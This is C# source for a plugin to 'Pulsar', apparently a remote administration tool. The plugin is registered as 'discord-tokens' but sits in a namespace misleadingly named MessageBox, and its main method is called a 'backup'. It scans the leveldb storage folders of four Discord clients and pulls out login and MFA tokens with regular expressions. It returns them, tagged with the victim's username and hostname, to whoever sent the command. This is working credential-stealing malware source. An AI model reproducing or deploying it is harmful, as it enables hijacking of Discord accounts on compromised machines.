using Pulsar.Common.Plugins;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Text;

namespace Pulsar.Plugin.MessageBox.Client
{
    public sealed class MessageBoxClientPlugin : IUniversalPlugin
    {
        public string PluginId => "discord-tokens";
        public string Version => "1.0.0";
        public string[] SupportedCommands => new[] { "tokens" };

        public bool IsComplete => true;

        public void Initialize(object initData) { }

        public PluginResult ExecuteCommand(string command, object parameters)
        {
            if (command.Equals("tokens", StringComparison.OrdinalIgnoreCase))
            {
                return HandleBackupCommand();
            }

            return new PluginResult
            {
                Success = false,
                Message = $"Command '{command}' not supported.",
                ShouldUnload = false
            };
        }

        private PluginResult HandleBackupCommand()
        {
            try
            {
                var tokens = DiscordGrabber.GetTokens();

                if (tokens.Count == 0)
                {
                    return new PluginResult
                    {
                        Success = false,
                        Message = "No Discord tokens found on this system.",
                        ShouldUnload = false
                    };
                }

                string hostname = Environment.MachineName;
                string username = Environment.UserName;

                string userHostName = $"{username}@{hostname}";

                string tokensMessage = string.Join("\n", tokens);

                return new PluginResult
                {
                    Success = true,
                    Message = $"{userHostName}\nTokens:\n{tokensMessage}",
                    ShouldUnload = false
                };
            }
            catch (Exception ex)
            {
                return new PluginResult
                {
                    Success = false,
                    Message = $"Error during backup: {ex.Message}",
                    ShouldUnload = false
                };
            }
        }

        public void Cleanup() { }
    }

    internal static class DiscordGrabber
    {
        internal readonly static DirectoryInfo[] RootFolders =
        {
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discord\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discordptb\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discordcanary\Local Storage\leveldb"),
            new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\discorddevelopment\Local Storage\leveldb"),
        };

        public static List<string> GetTokens()
        {
            List<string> tokens = new List<string>();

            foreach (DirectoryInfo rootFolder in RootFolders)
            {
                if (!rootFolder.Exists) continue;
                foreach (FileInfo file in rootFolder.GetFiles("*.ldb"))
                {
                    string content = file.OpenText().ReadToEnd();

                    foreach (Match match in Regex.Matches(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                        tokens.Add(match.Value);

                    foreach (Match match in Regex.Matches(content, @"mfa\.[\w-]{84}"))
                        tokens.Add(match.Value);
                }
            }

            return tokens.Distinct().ToList();
        }
    }
}
